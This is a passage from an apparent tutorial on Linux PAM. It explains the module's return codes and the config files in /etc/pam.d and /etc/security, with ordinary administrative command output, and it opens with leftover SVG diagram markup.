<text text-anchor='middle' x='400' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='308' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='400' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='400' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='116' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='408' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='244' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='408' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='308' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='408' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='356' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='408' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='308' fill='currentColor' style='font-size:1em'>M</text>
<text text-anchor='middle' x='416' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='416' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='84' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='424' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='424' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='84' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='432' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='356' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='432' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='84' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='440' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='440' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='132' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='448' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='260' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='448' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='448' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='84' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='456' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='456' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='340' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='480' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='480' y='372' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='488' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='52' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='496' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='116' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='496' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='356' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='496' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='504' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='356' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='512' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='520' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='536' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='544' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='356' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='552' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='560' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='568' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='356' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='584' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='592' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='356' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='600' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='608' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='52' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='616' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='616' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='616' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='616' y='116' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='616' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='616' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='116' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='624' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='244' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='624' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='624' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='632' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='84' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='640' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='640' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='84' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='648' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='356' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='648' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='84' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='656' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='132' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='656' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='260' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='656' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='356' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='656' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='84' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='672' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='52' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='704' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='704' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='704' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='704' y='116' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='704' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='260' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='744' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='340' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='744' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='372' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
<p>Assume the user attempts to log into <code>APP 1</code>, which checks the PAM to see if the user is authenticated and authorised. If the query is successful, PAM returns the status code <code>PAM_SUCCESS</code>; otherwise, it returns one of the other relevant codes.
The complete list of return codes and their meanings can be found in their github repository, which can be found <a href="https://github.com/linux-pam/linux-pam/blob/b872b6e68a60ae351ca4c7eea6dfe95cd8f8d130/libpam/include/security/_pam_types.h#L29">here</a>. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<h2 id="configuring-pam">Configuring PAM</h2>
<p>PAM&rsquo;s main feature is the module configuration it offers. PAM looks at these text configuration files to determine what security actions to take for an application, and the administrator can add or remove new rules at any time. PAM is also extensible, which means that if we want to add new features (such as 2FA/MFA), we only need to change a few files and <code>login</code> can now use them.</p>
<p>In RedHat based systems, all of the pam config files can be easily located with the below command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ rpm -ql pam | grep /etc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/etc/pam.d
</span></span><span class="line"><span class="cl">/etc/pam.d/config-util
</span></span><span class="line"><span class="cl">/etc/pam.d/fingerprint-auth
</span></span><span class="line"><span class="cl">/etc/pam.d/other
</span></span><span class="line"><span class="cl">/etc/pam.d/password-auth
</span></span><span class="line"><span class="cl">/etc/pam.d/postlogin
</span></span><span class="line"><span class="cl">/etc/pam.d/smartcard-auth
</span></span><span class="line"><span class="cl">/etc/pam.d/system-auth
</span></span><span class="line"><span class="cl">/etc/security
</span></span><span class="line"><span class="cl">/etc/security/access.conf
</span></span><span class="line"><span class="cl">/etc/security/chroot.conf
</span></span><span class="line"><span class="cl">/etc/security/console.apps
</span></span><span class="line"><span class="cl">/etc/security/console.handlers
</span></span><span class="line"><span class="cl">/etc/security/console.perms
</span></span><span class="line"><span class="cl">/etc/security/console.perms.d
</span></span><span class="line"><span class="cl">/etc/security/group.conf
</span></span><span class="line"><span class="cl">/etc/security/limits.conf
</span></span><span class="line"><span class="cl">/etc/security/limits.d
</span></span><span class="line"><span class="cl">/etc/security/limits.d/20-nproc.conf
</span></span><span class="line"><span class="cl">/etc/security/namespace.conf
</span></span><span class="line"><span class="cl">/etc/security/namespace.d
</span></span><span class="line"><span class="cl">/etc/security/namespace.init
</span></span><span class="line"><span class="cl">/etc/security/opasswd
</span></span><span class="line"><span class="cl">/etc/security/pam_env.conf
</span></span><span class="line"><span class="cl">/etc/security/sepermit.conf
</span></span><span class="line"><span class="cl">/etc/security/time.conf
</span></span></code></pre></div><p>There are two main directories here: <code>/etc/pam.d</code> and <code>/etc/security</code>. Both of these directories play important roles in configuring PAM behaviour.</p>
<p>Each file in the <code>/etc/pam.d</code> folder contains rules that are read by PAM at runtime. If the user attempts to login via <code>ssh</code>, he must be authenticated. PAM checks rules from the <code>sshd</code> file in the <code>/etc/pam.d/</code> folder after <strong>sshd</strong> sends an authentication request to PAM. If the file is present, the file&rsquo;s rules are read and a proper response is returned to the application. If the file is missing, the default behaviour is to read the rules from <code>other</code> file in same directory and act on them.</p>
<p>Let&rsquo;s take a look at <code>/etc/pam.d/</code> folder to get better picture of what&rsquo;s in it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ls -l /etc/pam.d
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  192 Feb  2  2021 chfn
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  192 Feb  2  2021 chsh
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  232 Apr  1  2020 config-util
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  287 Jan 13  2022 crond
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   19 Nov 18 13:01 fingerprint-auth -&gt; fingerprint-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  702 Nov 18 13:01 fingerprint-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  796 Feb  2  2021 login
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  154 Apr  1  2020 other
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  188 Apr  1  2020 passwd
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   16 Nov 18 13:01 password-auth -&gt; password-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root 1033 Nov 18 13:01 password-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  155 Jan 25  2022 polkit-1
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   12 Nov 18 13:01 postlogin -&gt; postlogin-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  330 Nov 18 13:01 postlogin-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  681 Feb  2  2021 remote
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  143 Feb  2  2021 runuser
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  138 Feb  2  2021 runuser-l
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   17 Nov 18 13:01 smartcard-auth -&gt; smartcard-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  752 Nov 18 13:01 smartcard-auth-ac
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   25 Nov 18 12:57 smtp -&gt; /etc/alternatives/mta-pam
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root   76 Apr  1  2020 smtp.postfix
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  904 Nov 24  2021 sshd
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  540 Feb  2  2021 su
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  200 Oct 14  2021 sudo
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  178 Oct 14  2021 sudo-i
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  137 Feb  2  2021 su-l
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   14 Nov 18 13:01 system-auth -&gt; system-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root 1031 Nov 18 13:01 system-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  129 Sep  1 14:57 systemd-user
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root   84 Nov 24  2021 vlock
</span></span></code></pre></div><p>There are more files than what the rpm command above revealed. The reason for this is straightforward: we examined files installed by the <code>pam</code> package itself. Other files are installed by the packages that they belong to. The <code>openssh-server</code> package, for example, installed the <code>sshd</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ rpm -qf /etc/pam.d/sshd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">openssh-server-7.4p1-22.el7_9.x86_64
</span></span></code></pre></div><p>We now know that pam has rule files for each application as well as a default <code>other</code> file for all applications that do not have dedicated rule files. We won&rsquo;t always need this, but it&rsquo;s a good idea to keep it in the back of our minds.</p>
<p>Let&rsquo;s take a closer look at these rules from the <code>sshd</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /etc/pam.d/sshd
